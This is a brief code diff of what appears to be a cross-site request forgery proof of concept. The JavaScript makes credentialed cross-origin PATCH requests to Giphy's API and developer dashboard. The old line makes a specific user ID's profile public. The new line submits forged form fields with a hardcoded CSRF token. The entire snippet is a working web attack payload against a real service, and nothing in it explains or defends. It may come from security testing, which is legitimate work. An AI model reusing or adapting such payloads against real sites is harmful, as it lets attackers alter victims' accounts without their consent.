@@ -9,7 +9,7 @@ var xhr = new XMLHttpRequest();
         }
     };
     xhr.withCredentials = true;
-    xhr.open("patch", "https://giphy.com/api/v1/users/38283249/", true);
+    xhr.open("patch", "https://devportal-new.giphy.com/dashboard/", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
-    xhr.send("is_public=true");
+    xhr.send("description=hellomoto&name=hihihi&&name=ok&terms=true&csrfmiddlewaretoken=2m6JbbMyheMZxntLv1Z9IKcEbbRtRcan0ms2rob3vkY8x8vs83Xb3DrpHLQKRLHP&filename=2m6JbbMyheMZxntLv1Z9IKcEbbRtRcan0ms2rob3vkY8x8vs83Xb3DrpHLQKRLHP");
